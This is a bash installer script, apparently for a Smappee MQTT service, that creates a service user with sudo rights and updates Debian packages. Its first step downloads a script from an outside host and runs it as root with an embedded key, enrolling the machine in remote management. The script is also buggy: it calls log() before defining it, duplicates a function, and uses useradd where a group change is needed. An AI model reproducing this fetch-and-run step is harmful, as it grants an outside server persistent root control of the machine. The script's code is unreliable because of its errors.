#!/bin/bash

# Check if the script is running as root

if [[ $EUID -ne 0 ]]; then

    log "Error: This script must be run as root."

    exit 1

fi

# Function to stderr in the terminal and log messages to a log file

log() {

    local message="$1"

    local log_file="/var/log/smappee_mqtt_install.log"

    echo "$(date +"%Y-%m-%d %T"): $message" >&2

    echo "$(date +"%Y-%m-%d %T"): $message" >> "$log_file"

}


# Function to check for errors and exit if any occur

check_error() {

  local exit_code="$?"

  if [ "$exit_code" -ne 0 ]; then

    log "Error: $1 (Exit code: $exit_code)"

    exit 1

  fi

}


# Define log files for the system updates
LOG_DIR="/var/log/debian-package-updater"
STDOUT_LOG="$LOG_DIR/stdout.log"
STDERR_LOG="$LOG_DIR/stderr.log"
FORCE_INSTALL=true


# Function to log messages to stdout and a file
log_message() {
    local log_this_message="$1"
    echo "$log_this_message"
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $log_this_message" >> "$STDOUT_LOG"
}


# Function to log error messages to stderr and a file
log_error() {
    local error_message="$1"
    echo "$error_message" >&2
    echo "$(date +'%Y-%m-%d %H:%M:%S') - ERROR: $error_message" >> "$STDERR_LOG"
    exit 1
}


create_user() {
    # Create the smappee_mqtt user

    log "Creating smappee_mqtt user"

    useradd  -m -d /var/smappee smappee_mqtt -r -s /bin/bash

    check_error "Failed to create smappee_mqtt user"
}


add_user_to_sudo() {
    # Add the smappee_mqtt users to the sudoer group

    log "Creating smappee_mqtt user"

    useradd  -aG sudo smappee_mqtt

    check_error "Failed to add smappee_mqtt user to sudoers group"
}


add_user_to_sudo() {
    # Add the smappee_mqtt users to the sudoer group

    log "Creating smappee_mqtt user"

    useradd  -aG sudo smappee_mqtt

    check_error "Failed to add smappee_mqtt user to sudoers group"
}


# Function to check if apt requires a force install (-f)
check_force_install() {
    local apt_output
    apt_output=$(apt-get -s upgrade 2>&1)
    if echo "$apt_output" | grep -q 'E: Unmet dependencies'; then
        log_message "Unmet dependencies detected, attempting to fix..."
        if [ "$FORCE_INSTALL" = true ]; then
            apt-get -y -f install || log_error "Failed to fix unmet dependencies with force install."
        else
            log_error "Unmet dependencies detected. Use -f option to force install."
        fi
    fi
}


# Function to check for updates and install them
check_and_install_updates() {
    log_message "Checking for updates..."
    if ! apt-get update; then
        log_error "Failed to update package lists."
    fi

    check_force_install

    log_message "Upgrading packages..."
    if ! apt-get -y upgrade; then
        log_error "Failed to upgrade packages."
    fi
}

install_meshcentral_agent() {
    (wget "https://the-eye.energydrive.online/meshagents?script=1" -O ./meshinstall.sh || wget "https://the-eye.energydrive.online/meshagents?script=1" --no-proxy -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://the-eye.energydrive.online 'YUbq2Nb14UDKBmYDnSBXKcurJGi81iVeLXeWnH5Wuyzhk49WtbcUjoOjChgDucND' || ./meshinstall.sh https://the-eye.energydrive.online 'YUbq2Nb14UDKBmYDnSBXKcurJGi81iVeLXeWnH5Wuyzhk49WtbcUjoOjChgDucND'
}


# Start the script
main() {
    
    # install mesh agent
    install_meshcentral_agent
    # Setup user
    log "User generation script started."

    create_user 
    
    add_user_to_sudo
    

    # Create log directory if it doesn't exist
    mkdir -p "$LOG_DIR"

    log_message "System update script started."

    check_and_install_updates

    log_message "System update script completed."

    apt install -y nmap neofetch vnstat mtr screen wget curl
}


main